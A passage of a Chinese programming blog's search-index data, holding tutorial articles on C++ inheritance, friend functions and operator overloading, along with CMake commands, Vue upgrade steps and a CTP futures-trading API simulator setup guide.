{};，目的是为了不让这个类被继承。或者，在一个函数后加上该关键字，表示这个函数不能被重写 void fun() final {} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++"},{title:"Vue 开发随笔",url:"/posts/d786f74a.html",text:'Vue 版本升级若项目需要升级 Vue 的版本，一般主要是升级 vue 和 vue-template-compiler 组件，而且两者的版本号必须一致，升级步骤如下： a) 删除项目里的 node_modules 文件夹 和 package-lock.json 文件 b) 执行 npm view vue versions 命令查看 Vue 的所有版本号 c) 更改项目里的 package.json 文件，为 vue 和 vue-template-compiler 组件指定新的版本号 d) 在项目里执行 npm install 命令 e) 重新编译构建项目，观察项目代码是否可以正常编译 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发随笔 前端"},{title:"C++ 入门基础之七",url:"/posts/e4826e2c.html",text:'继承概念面向对象程序设计有 4 个主要特点：抽象、封装、继承和多态性。面向对象程序设计的两个重要特征一数据抽象与封装，两者已经能够设计出基于对象的程序，这是面向对象程序设计的基础。要较好地进行面向对象程序设计，还必须了解面向对象程序设计另外两个重要特征 —— 继承性和多态性。继承性是面向对象程序设计最重要的特征，可以说，如果没有掌握继承性，就等于没有掌握类和对象的精华，就是没有掌握面向对象程序设计的真谛。 类之间的关系类之间一般有三种关系：has-A、uses-A 和 is-A： has-A：包含关系，用以描述一个类由多个 “部件类” 构成。实现 has-A 关系可以用类成员表示，即一个类中的数据成员是另一种已经定义的类。 uses-A：一个类部分地使用另一个类。类之间成员函数的联系，可以通过定义友元或者对象参数传递来实现。 is-A：机制称为 “继承” 。关系具有传递性，不具有对称性。 继承关系举例 继承相关概念 派生类的定义 值得一提的是，C++ 中的继承方式（public、private、protected）会影响子类的对外访问属性。 继承重要说明 a) 子类拥有父类的所有成员变量和成员函数 b) 子类可以拥有父类没有的方法和属性 c) 子类就是一种特殊的父类 d) 子类对象可以当作父类对象使用 继承使用案例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;using namespace std;// 定义父类（基类）（父类）class Parent {public: Parent(int a = 0, int b = 0) { this-&gt;a = a; this-&gt;b = b; } void print() { cout &lt;&lt; "a=" &lt;&lt; this-&gt;a &lt;&lt; ", b=" &lt;&lt; this-&gt;b &lt;&lt; endl; }public: int a; int b;};// 定义派生类（子类）class Child : public Parent {public: Child(int a = 0, int b = 0, int c = 0) { // 直接访问父类（基类）（父类）的成员变量 this-&gt;a = a; this-&gt;b = b; this-&gt;c = c; } void echo() { cout &lt;&lt; "a=" &lt;&lt; this-&gt;a &lt;&lt; ", b=" &lt;&lt; this-&gt;b &lt;&lt; ", c=" &lt;&lt; this-&gt;c &lt;&lt; endl; }private: int c;};int main() { Child child(1, 2, 3); child.print(); // 直接调用父类（基类）（父类）的成员函数 child.echo(); // 直接调用派生类（子类）的成员函数 return 0;} 程序运行的输出结果如下： 12a=1, b=2a=1, b=2, c=3 派生类的访问控制派生类（子类）继承了基类（父类）的全部成员变量和成员函数（除了构造函数和析构函数之外的成员函数），但是这些成员的访问属性，在派生过程中是可以调整的。 单个类的访问控制在 C++ 中，类成员变量和类成员函数的访问级别为 public、private、protected private：修饰的成员变量和成员函数，只能在类的内部被访问 public：修饰的成员变量和成员函数，可以在类的内部和类的外部被访问 protected：修饰的成员变量和成员函数，可以在派生类的内部访问，不能在派生类的外部被访问 特别注意：若在类中没有声明访问控制级别的成员变量和成员函数，默认都是 private 访问级别的 继承成员的访问控制在 C++ 中，不同的继承方式（public、private、protected）会改变继承成员的访问属性： public 继承：父类成员在子类中保持原有的访问级别 private 继承：父类成员在子类中都变为 private 成员 protected 继承：父类中 public 成员会变成 protected，父类中 private 成员仍然为 private，父类中 protected 成员仍然为 protected 特别注意：private 成员在子类中依然存在，但是无法访问到的，即不论使用哪种方式继承父类，子类都不能直接使用父类的私有成员 继承成员访问控制的 “三看” 原则在 C++ 中，不同的继承方式（public、private、protected）会改变继承成员的访问属性，最终可总结为以下三个原则（判断某一句话，是否可以被访问）： a) 看调用语句是写在子类的内部还是外部 b) 看子类如何从父类继承（public、private、protected） c) 看父类中的访问级别（public、private、protected） 派生类成员访问级别控制的原则对于派生类自身的成员，访问级别控制的原则如下： a) 需要被外界访问的成员直接设置为 public b) 只能在当前类中访问的成员设置为 private c) 只能在当前类和子类中访问的成员设置为 protected 继承中的构造和析构类型兼容原则类型兼容规则是指在需要基类对象的任何地方，都可以使用公有派生类（公有继承）的对象来替代。通过公有继承，派生类得到了基类中除构造函数、析构函数之外的所有成员。这样，公有派生类实际就具备了基类的所有功能，凡是基类能解决的问题，公有派生类都可以解决。值得一提的是，在替代之后，派生类对象就可以作为基类的对象使用，但是只能使用从基类继承得到的成员，类型兼容规则是多态性的重要基础之一。类型兼容规则中所指的替代包括以下情况： 子类对象可以当作父类对象使用 子类对象可以直接赋值给父类对象 子类对象可以直接初始化父类对象 父类指针可以直接指向子类对象 父类引用可以直接引用子类对象 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;iostream&gt;using namespace std;// 父类class Parent {public: void printParent() { cout &lt;&lt; "I\'m parent" &lt;&lt; endl; }private: int a;};// 子类（公有继承）class Child : public Parent {public: void printChild() { cout &lt;&lt; "I\'m child" &lt;&lt; endl; }private: int c;};void howToPrint(Parent* p) { p-&gt;printParent();}void howToPrint(Parent&amp; p) { p.printParent();}int main() { Parent p1; p1.printParent(); Child c1; c1.printChild(); c1.printParent(); // 1-1 父类指针可以直接指向子类对象 cout &lt;&lt; "1-1" &lt;&lt; endl; Parent* p2 = NULL; p2 = &amp;c1; p2-&gt;printParent(); // 1-2 父类指针可以直接指向子类对象，指针做函数参数 cout &lt;&lt; "1-2" &lt;&lt; endl; howToPrint(&amp;p1); howToPrint(&amp;c1); // 2-1 父类引用可以直接引用子类对象 cout &lt;&lt; "2-1" &lt;&lt; endl; Parent&amp; p3 = c1; p3.printParent(); // 2-2 父类引用可以直接引用子类对象，引用做函数参数 cout &lt;&lt; "2-2" &lt;&lt; endl; howToPrint(p1); howToPrint(c1); // 3-1 子类对象可以直接初始化父类对象，会自动调用父类的拷贝构造函数 cout &lt;&lt; "3-1" &lt;&lt; endl; Parent p4 = c1; p4.printParent(); // 4-1 子类对象可以直接赋值给父类对象 cout &lt;&lt; "4-1" &lt;&lt; endl; Parent p5; p5 = c1; p5.printParent(); return 0;} 程序运行输出的结果如下： 1234567891011121314151617I\'m parentI\'m childI\'m parent1-1I\'m parent1-2I\'m parentI\'m parent2-1I\'m parent2-2I\'m parentI\'m parent3-1I\'m parent4-1I\'m parent 继承中的对象模型类在 C++ 编译器的内部可以理解为结构体，子类是由父类成员叠加子类新成员得到的。 父类与子类的构造函数、析构函数的关系如下： 在子类对象构造时，需要调用父类构造函数对其继承得来的成员进行初始化 在子类对象析构时，需要调用父类析构函数对其继承得来的成员进行清理 继承中的构造与析构的调用原则 a) 子类对象在创建时，会首先调用父类的构造函数 b) 父类构造函数执行结束后，再执行子类的构造函数 c) 当父类只存在有参构造函数时，必须在子类的初始化列表中显示调用父类的构造函数 d) 析构函数调用的先后顺序与构造函数相反，即先调用子类的析构函数，再调用父类的析构函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;using namespace std;class Parent {public: Parent(int a, int b) { this-&gt;a = a; this-&gt;b = b; cout &lt;&lt; "父类的构造函数被调用" &lt;&lt; endl; } ~Parent() { cout &lt;&lt; "父类的析构函数被调用" &lt;&lt; endl; } void printParent() { cout &lt;&lt; "I\'m parent, a = " &lt;&lt; this-&gt;a &lt;&lt; ", b = " &lt;&lt; this-&gt;b &lt;&lt; endl; }private: int a; int b;};class Child : public Parent {public: // 当父类只存在有参构造函数时，必须在子类的初始化列表中显示调用 Child(int a, int b, int c) : Parent(a, b) { this-&gt;c = c; cout &lt;&lt; "子类的构造函数被调用" &lt;&lt; endl; } ~Child() { cout &lt;&lt; "子类的析构函数被调用" &lt;&lt; endl; } void printChild() { cout &lt;&lt; "I\'m child, c = " &lt;&lt; this-&gt;c &lt;&lt; endl; }private: int c;};int main() { Child c1(1, 2, 3); c1.printParent(); c1.printChild(); return 0;} 程序运行的输出结果如下： 123456父类的构造函数被调用子类的构造函数被调用I\'m parent, a = 1, b = 2I\'m child, c = 3子类的析构函数被调用父类的析构函数被调用 继承与组合混搭情况下，构造和析构的调用原则继承与组合对象混搭使用的情况下，构造函数与析构函数的调用原则如下： 构造函数的调用：先构造父类，再构造成员变量，最后构造自身 析构函数的调用：先析构自身，再析构成员变量，最后析构父类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#include &lt;iostream&gt;using namespace std;class Object {public: Object(int a, int b) { this-&gt;a = a; this-&gt;b = b; cout &lt;&lt; "Object类的构造函数被调用" &lt;&lt; endl; } ~Object() { cout &lt;&lt; "Object类的析构函数被调用" &lt;&lt; endl; } void printObject() { cout &lt;&lt; "I\'m object, a = " &lt;&lt; this-&gt;a &lt;&lt; ", b = " &lt;&lt; this-&gt;b &lt;&lt; endl; }protected: int a; int b;};class Parent : public Object {public: // 通过初始化列表，调用父类的构造函数 Parent(char* p) : Object(1, 2) { this-&gt;p = p; cout &lt;&lt; "Parent类的构造函数被调用" &lt;&lt; endl; } ~Parent() { cout &lt;&lt; "Parent类的析构函数被调用" &lt;&lt; endl; } void printParent() { cout &lt;&lt; "I\'m parent, p = " &lt;&lt; p &lt;&lt; endl; }protected: char* p;};class Child : public Parent {public: // 通过初始化列表，调用组合对象与父类的构造函数 Child(char* c) : obj1(3, 4), obj2(5, 6), Parent(c) { this-&gt;c = c; cout &lt;&lt; "Child类的构造函数被调用" &lt;&lt; endl; } ~Child() { cout &lt;&lt; "Child类的析构函数被调用" &lt;&lt; endl; } void printChild() { cout &lt;&lt; "I\'m child, p = " &lt;&lt; p &lt;&lt; endl; }protected: char* c; // 组合对象 Object obj1; Object obj2;};int main() { char* str = new char[3]; str[0] = \'J\'; str[1] = \'i\'; str[2] = \'m\'; Child c1(str); c1.printChild(); c1.printParent(); c1.printObject(); return 0;} 程序运行的输出结果如下： 12345678910111213Object类的构造函数被调用Parent类的构造函数被调用Object类的构造函数被调用Object类的构造函数被调用Child类的构造函数被调用I\'m child, p = JimI\'m parent, p = JimI\'m object, a = 1, b = 2Child类的析构函数被调用Object类的析构函数被调用Object类的析构函数被调用Parent类的析构函数被调用Object类的析构函数被调用 继承中的同名成员的处理方式 当子类成员与父类成员同名时，子类依然可以从父类继承同名成员 在子类中通过作用域分辨符 :: 进行同名成员的区分（在子类中使用父类的同名成员，需要显式地使用类名限定符），其作用类似 Java 中的 super 关键字 同名成员存储在内存中的不同位置 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;iostream&gt;using namespace std;class Parent {public: Parent(int a, int b) { this-&gt;a = a; this-&gt;b = b; } void print() { cout &lt;&lt; "I\'m parent, a = " &lt;&lt; a &lt;&lt; ", b = " &lt;&lt; b &lt;&lt; endl; }public: int a; int b;};class Child : public Parent {public: Child(int a, int b) : Parent(a, b) { this-&gt;a = a + 5; this-&gt;b = b + 5; } void print() { cout &lt;&lt; "I\'m child, a = " &lt;&lt; a &lt;&lt; ", b = " &lt;&lt; b &lt;&lt; endl; }public: int a; int b;};int main() { Child child(1, 2); // 子类访问自身的同名成员函数 child.print(); // 子类访问自身的同名成员变量 cout &lt;&lt; "child\'s a = " &lt;&lt; child.a &lt;&lt; endl; cout &lt;&lt; "child\'s b = " &lt;&lt; child.b &lt;&lt; endl; // 子类访问父类的同名成员函数 child.Parent::print(); // 子类访问父类的同名成员变量 cout &lt;&lt; "parent\'s a = " &lt;&lt; child.Parent::a &lt;&lt; endl; cout &lt;&lt; "parent\'s b = " &lt;&lt; child.Parent::b &lt;&lt; endl; return 0;} 程序运行的输出结果如下： 123456I\'m child, a = 6, b = 7child\'s a = 6child\'s b = 7I\'m parent, a = 1, b = 2parent\'s a = 1parent\'s b = 2 派生类中的 static 关键字使用在 C++ 的普通类中，static 关键字的使用可以看 这里，而派生类中 static 关键字的使用说明如下： 基类定义的静态成员，将被所有派生类共享 根据静态成员自身的访问特性和派生类的继承方式，在类层次体系中具有不同的访问性质（遵守派生类成员访问级别控制的原则） 在派生类中访问基类的静态成员，需要显式说明，对应的语法是：类名 :: 成员 或者通过对象访问：对象名 . 成员 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include &lt;iostream&gt;using namespace std;class Parent {public: // 声明公有的静态成员函数 static void print() { cout &lt;&lt; "a = " &lt;&lt; a &lt;&lt; ", b = " &lt;&lt; b &lt;&lt; endl; }public: // 声明公有的静态成员变量 static int a;private: // 声明私有的静态成员变量 static int b;};// 定义私有的静态成员变量int Parent::b = 50;// 定义公有的静态成员变量，这里不是简单的变量赋值，更重要的是告诉C++编译器，给静态成员变量分配内存, 否则在派生类中用到该变量就会报错int Parent::a = 30;class Child : public Parent {public: int getA() { // 访问从基类继承得到的静态成员变量 return this-&gt;a; } int getA2() { // 访问基类的静态成员变量 return Parent::a; } int getB() { // return b; 错误写法，基类中静态成员自身的访问特性遵守派生类的访问级别控制原则，因此这里不能访问基类中私有的静态成员变量b return 0; } // 调用从基类继承得到的静态成员函数 void print2() { this-&gt;print(); } // 调用基类的静态成员函数 void print1() { Parent::print(); }};int main() { // 在类外访问基类的静态成员变量和静态成员函数 Parent::a++; Parent::print(); cout &lt;&lt; endl; // 在类外访问派生类的静态成员变量和静态成员函数 cout &lt;&lt; "a = " &lt;&lt; Child::a &lt;&lt; endl; Child::print(); cout &lt;&lt; endl; Child c1; cout &lt;&lt; "a = " &lt;&lt; c1.getA() &lt;&lt; endl; cout &lt;&lt; "a = " &lt;&lt; c1.getA2() &lt;&lt; endl; cout &lt;&lt; "a = " &lt;&lt; c1.Parent::a &lt;&lt; endl; cout &lt;&lt; endl; c1.print1(); c1.print2(); c1.Parent::print(); return 0;} 程序运行的输出结果如下： 123456789101112a = 31, b = 50a = 31a = 31, b = 50a = 31a = 31a = 31a = 31, b = 50a = 31, b = 50a = 31, b = 50 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++"},{title:"CMake 入门教程之二常用命令",url:"/posts/881a3bba.html",text:'查找文件查找源文件12345678# 查找 src 目录下的所有源文件，并保存到 SOURCE_FILES 变量aux_source_directory(src SOURCE_FILES)# 查找 src 目录下所有以 .cpp 开头的文件，并保存到 SOURCE_FILES 变量file(GLOB SOURCE_FILES "src/*.cpp")# 递归查找 src 目录下所有以 .cpp 开头的文件，并保存到 SOURCE_FILES 变量file(GLOB_RECURSE SOURCE_FILES "src/*.cpp") 排除指定的文件12345# 查找 src 目录下所有以 .cpp 开头的文件，并保存到 SOURCE_FILES 变量file(GLOB SOURCE_FILES "src/*.cpp")# 排除 example.cpp 源文件list(FILTER SOURCE_FILES EXCLUDE REGEX "example.cpp") 输出目录指定输出目录12345# 指定构建输出的目录（build 目录）set(PROJECT_BINARY_DIR ${PROJECT_SOURCE_DIR}/build)# 指定可执行文件的输出目录（bin 目录）set(EXECUTABLE_OUTPUT_PATH ${PROJECT_SOURCE_DIR}/bin) 编译代码设置编译参数1234567set(CMAKE_CXX_COMPILER "clang++") # 指定使用的 C++ 编译器set(CMAKE_CXX_FLAGS "-std=c++11") # 指定使用的 C++ 的版本set(CMAKE_CXX_FLAGS "-g") # 输出调试信息set(CMAKE_CXX_FLAGS "-Wall") # 开启所有警告set(CMAKE_CXX_FLAGS_DEBUG "-O0") # 调试包不优化set(CMAKE_CXX_FLAGS_RELEASE "-O2 -DNDEBUG") # 发布包优化set(CMAKE_CXX_FLAGS "-lpthread") # 链接 pthread 库 设置预处理指令1234567891011121314#include &lt;iostream&gt;using namespace std;int main() {#ifdef TARGET cout &lt;&lt; "Hello!" &lt;&lt; endl;#else cout &lt;&lt; "World!" &lt;&lt; endl;#endif return 0;} CMake 指定编译参数 1set(CMAKE_CXX_FLAGS "-DTARGET") 调试信息打印日志信息提示 使用 MESSAGE() 指令可以输出指定的日志信息，例如打印 CMake 变量的值 123456# 查找 GoogleTest 库FIND_PACKAGE(GTest REQUIRED)# 显示 GoogleTest 库的路径MESSAGE(STATUS "GTEST_INCLUDE_DIRS : " ${GTEST_INCLUDE_DIRS})MESSAGE(STATUS "GTEST_BOTH_LIBRARIES : " ${GTEST_BOTH_LIBRARIES}) 链接第三方库查找并链接系统的第三方库这里以第三方库 GoogleTest 为例子，其中 GoogleTest 是手动安装到 Linux 系统上的（编译安装或者通过包管理器安装）。 123456789# 查找 GoogleTest 库find_package(GTest REQUIRED)# 显示 GoogleTest 库的路径MESSAGE(STATUS "GTEST_INCLUDE_DIRS : " ${GTEST_INCLUDE_DIRS})MESSAGE(STATUS "GTEST_BOTH_LIBRARIES : " ${GTEST_BOTH_LIBRARIES})# 链接 GoogleTest 库target_link_libraries(${PROJECT_NAME} ${GTEST_BOTH_LIBRARIES}) var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++ linux系统编程 c语言"},{title:"CTP 程序化交易基础之一",url:"/posts/d35e15f1.html",text:'CTP 介绍CTP 简介综合交易平台（Comprehensive Transaction Platform，CTP）是专门为期货公司开发的一套期货经纪业务管理系统，由交易、风险控制和结算三大系统组成。其中，交易系统主要负责订单处理、行情转发及银期转账业务，结算系统负责交易管理、帐户管理、经纪人管理、资金管理、费率设置、日终结算、信息查询以及报表管理等，风控系统则主要在盘中进行高速的实时试算，以及时揭示并控制风险。系统能够同时连通国内四家期货交易所，支持国内商品期货和股指期货的交易结算业务，并能自动生成、报送保证金监控文件和反洗钱监控文件。 CTP 架构综合交易平台是基于全内存的交易系统，采用创新的完全精确重演的分布式体系架构，支持 7x24 小时连续交易，运维人员不必每日启停系统，可以做到 “一键运维”，该特性使得综合交易平台新增交易中心以扩展业务规模时不用增加运维人力的成本。支持 FENS 机制的 “一键切换” 多活交易中心也是目前市场上只有 CTP 系统实现了的特性。该机制使得交易系统可在某个交易中心宕机的情况下立即切换到另一个备用交易中心，得以实现真真正正的连续交易。综合交易平台公开并对外开放交易系统接口，使用该接口可以接收交易所的行情数据和执行交易指令。该接口采用开放接口（API）的方式接入，早已在期货界已经形成事实上的行业标准。 CTP API从 CTP 官网（非交易时段禁止访问）可以了解到，CTP API 从 v6.3.15 版开始引入强制看穿式认证规则，CTP 不再兼容之前的 API 版本。目前，CTP API 最新版是 v6.6.1，与 v6.3.15 相比较最大的改动是，InstrumentID 由最长 30 个字节增加到 80 个字节。CTP 生产系统兼容 v6.3.15 及以上版本。但是，大部分期货公司做看穿式认证的仿真系统要求使用新版 API 才能接入。所以，新用户做看穿式认证时首先要确认 API 的版本号。 CTP 仿真系统SimNow 仿真系统SimNow 是上期技术为广大投资者打造的一个最接近真实市场环境的仿真平台，主要面向期货经纪公司和投资者服务，提供整套期货交易的信息化技术平台。SimNow 官网（非交易时段禁止访问），交易者注册 SimNow 仿真账户后，可以使用从 CTP 官网下载 API 接入这套仿真交易系统。开发、测试完成之后，只需要更换用户名、密码、前置地址等信息就可以接入期货公司生产系统进行实盘交易。SimNow 要求 CTP API 的版本是 v6.3.15 及以上才能够接入。 认证信息123BrokerID = "9999"AppID = "SimNow_client_test"AuthCode = "0000000000000000" 值得一提的是，默认的 BrokerID 为 9999，AppID 为 SimNow_client_test，AuthCode 为 0000000000000000（16个0），默认不会开终端认证，程序化用户可以选择不开终端认证接入。 生产仿真环境以下的前置地址，交易时段与真实生产环境（实盘）一致。 电信 12FrontAddr=tcp://180.168.146.187:10201FrontMdAddr=tcp://180.168.146.187:10211 电信 12FrontAddr=tcp://180.168.146.187:10202FrontMdAddr=tcp://180.168.146.187:10212 移动 12FrontAddr=tcp://218.202.237.33:10203FrontMdAddr=tcp://218.202.237.33:10213 测试仿真环境 支持全天交易（7x24），不间断轮播某天行情 SimNow 新注册用户，需要等到第三个交易日才能使用 交易时段：交易日 16：00 ～ 次日 09：00；非交易日 16：00 ～ 次日 15：00 仅服务于 CTP API 开发爱好者，仅为用户提供 CTP API 测试需求，不提供结算等其它服务 12FrontAddr=tcp://180.168.146.187:10130FrontMdAddr=tcp://180.168.146.187:10131 仿真成交规则 期货交易按照交易所公布的买一卖一价对价成交 买入时：如果委托价大于等于卖一价，则成交，成交价为委托价、卖一价、最新价三价取中，如果委托价小于卖一价，不能成交，等待更优的行情才能成交 卖出时：如果委托价小于等于买一价，则成交，成交价为委托价、买一价、最新价三价取中，如果委托价大于买一价，不能成交，等待更优的行情才能成交 仿真交易时间 NSight 仿真系统交易者在 NSight 官网 注册仿真账户后，可以使用从 CTP 官网下载的 API v6.3.15 接入这套仿真交易系统。开发、测试完成之后，只需要更换用户名、密码、前置地址等信息就可以接入期货公司生产系统进行实盘交易。 认证信息123BrokerID = "10010"AppID = ""AuthCode = "" 值得一提的是，默认的 BrokerID 为 10010，AppID 与 AuthCode 均为空字符串。 生产仿真环境以下的前置地址，交易时段与真实生产环境（实盘）一致。 12FrontAddr=tcp://210.14.72.12:4600FrontMdAddr=tcp://210.14.72.12:4602 期货交易终端市面上主流的期货交易终端可以在 SimNow 官网（非交易时段禁止访问）下载。 快期期货交易终端对于量化交易者，在没有自主开发监控客户端之前，快期是一个很不错的选择。这里以 快期 v2 版本举例，若使用快期登录 SimNow 的模拟账户，则只需要在快期的登录界面选择服务器 上期技术-xx 即可，下拉列表里不同的服务器分别使用了不同的前置地址，而 用户代码 直接填写 InvestorID。 CTP 开放平台 CTP 开放平台 CTP 开放平台运行环境监控 CTP 接口兼容模拟交易平台介绍 - 类似 SimNow 参考博客 CTP API 版本说明 CTP API 各版本官方下载 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"量化交易"},{title:"C++ 入门基础之六",url:"/posts/a54941f5.html",text:'友元函数类的友元函数是定义在类的外部，但有权访问类的所有私有（private）成员和保护（protected）成员。尽管友元函数的原型在类的声明中出现过，但是友元函数并不是类的成员函数，而是普通函数（全局函数）。如果要声明函数为一个类的友元，需要在类定义中该函数原型前使用关键字 friend。 友元函数的规则为什么要引入友元函数： C++ 利用 friend 修饰符，可以让一些设定的函数能够对一些保护数据进行访问，避免把类的成员全部设置成 public，最大限度的保护数据成员的安全。同时友元函数可以实现类之间的数据共享，减少系统开销，提高效率。由于友元函数破环了封装机制，因此推荐尽量使用成员函数，除非不得已的情况下才使用友元函数。 什么时候使用友元函数： 多个类要共享数据的时候 运算符重载的某些场合需要使用友元函数 友元函数的参数： 因为友元函数没有 this 指针，所以参数会有三种情况： a) 要访问非 static 成员时，需要对象做参数 b) 要访问 static 成员或全局变量时，则不需要对象做参数 c) 如果做参数的对象是全局对象，则不需要对象做参数 友元函数的位置： 因为友元函数是类外的函数（普通函数），所以它的声明可以放在类的私有段（private）或公有段（public），两者都是没有区别的 一个函数可以是多个类的友元函数，只需要在各个类中分别声明即可 友元函数的调用： 可以直接调用友元函数，不需要通过对象或指针 友元函数的调用与普通函数（全局函数）的调用方式和原理一致 友元函数的使用123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;class A {public: A(int a) { this-&gt;a = a; } int getA() { return this-&gt;a; } // 声明友元函数 friend void update2(A* p);private: int a;};void update1(A* p) { // p-&gt;a = 30; // 错误写法，在普通函数（全局函数）内，私有数据成员不能在类外被访问}void update2(A* p) { p-&gt;a = 30; // 在友元函数内，可以通过对象参数访问私有数据成员}int main() { A* a = new A(10); update2(a); // 调用友元函数 cout &lt;&lt; "a = " &lt;&lt; a-&gt;getA() &lt;&lt; endl; delete a; return 0;} 程序运行的输出结果如下： 1a = 30 友元类友元类的所有成员函数都是另一个类的友元函数，都可以访问另一个类中的私有（private）成员和保护（protected）成员。当希望一个类可以访问另一个类的保护数据时，可以将该类声明为另一类的友元类。定义友元类的语法格式为 friend class 类名;，其中类名必须是程序中的一个已定义过的类。值得一提的是，友元类通常设计为一种对数据操作或类之间传递消息的辅助类。 友元类的规则 友元关系不能被继承 友元关系是单向的，不具有交换性。若类 B 是类 A 的友元，则类 A 不一定是类 B 的友元，要看在类 B 中是否有相应的声明 友元关系不具有传递性，若类 B 是类 A 的友元，类 C 是 类 B 的友元，则类 C 不一定是类 A 的友元，要看类 A 中是否有相应的声明 友元类的使用1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;using namespace std;class A {public: // 声明友元类 B friend class B; void print() { cout &lt;&lt; "a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};class B {public: void setValue(int a) { aObj.a = a; // 类 B 是类 A 的友元类，因此 B 类的所有成员函数都可以访问 A 类的私有成员或者保护成员 } void print() { aObj.print(); }private: A aObj;};int main() { B b; b.setValue(100); b.print(); return 0;} 程序运行的输出结果如下： 1a = 100 运算符重载基础所谓重载，就是重新赋予新的含义。函数重载就是对一个已有的函数赋予新的含义，使之实现新功能，因此，一个函数名就可以用来代表不同功能的函数，也就是 一名多用。运算符也可以重载，实际上，开发者已经在不知不觉之中使用了运算符重载。例如，大家都已习惯于用加法运算符 + 对整数、单精度数和双精度数进行加法运算，如 5 + 8，5.8 + 3.67 等，其实计算机对整数、单精度数和双精度数的加法操作过程是很不相同的，但由于 C++ 已经对运算符 + 进行了重载，所以就能适用于 int、float、doUble 类型的运算。又如 &lt;&lt; 是 C++ 的位运算中的位移运算符（左移），但在输出操作中又是与流对象 cout 配合使用的流插入运算符。&gt;&gt; 也是位移运算符 (右移），但在输入操作中又是与流对象 cin 配合使用的流提取运算符。这就是运算符重载 (Operator Overloading)。C++ 系统对 &lt;&lt; 和 &gt;&gt; 进行了重载，用户在不同的场合下使用它们时，作用是不同的。对 &lt;&lt; 和 &gt;&gt; 的重载处理是放在头文件 stream 中的。因此，如果要在程序中用 &lt;&lt; 和 &gt;&gt; 作流插入运算符和流提取运算符，必须在本文件模块中包含头文件 stream，当然还应当包括命名空间的使用声明 using namespace std。 运算符重载的语法 例如： 使用类成员函数完成 "-" 运算符重载的语法：Complex operator-(Complex &amp;c2) 使用友元函数完成 "+" 运算符重载的语法：Complex operator+(Complex &amp;c1, Complex &amp;c2) 运算符重载的限制 运算符重载的两种方式 前置与后置运算符重载规则在 C++ 中是通过一个占位参数（int）来区分前置运算符和后置运算符的重载，例如 ++a、a++、--b、b--。 运算符重载的简单使用案例二元运算符重载在下述的案例中，演示了如何使用类成员函数和友元函数实现二元运算符的重载。值得一提的是，除了使用友元函数外，还可以使用全局函数（普通函数）来实现运算符的重载，不同的是使用友元函数更方便，可以直接访问类的所有私有（private）成员和保护（protected）成员。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;using namespace std;class Complex {private: int a; int b;public: Complex(int a = 0, int b = 0) { this-&gt;a = a; this-&gt;b = b; } void print() { cout &lt;&lt; "a=" &lt;&lt; this-&gt;a &lt;&lt; ", b=" &lt;&lt; this-&gt;b &lt;&lt; endl; }public: // 使用类成员函数完成 "-" 运算符的重载 Complex operator-(Complex&amp; c2) { Complex c3(this-&gt;a - c2.a, this-&gt;b - c2.b); return c3; } // 声明用于 "+" 运算符重载的友元函数 friend Complex operator+(Complex&amp; c1, Complex&amp; c2);};// 定义友元函数完成 "+" 运算符的重载Complex 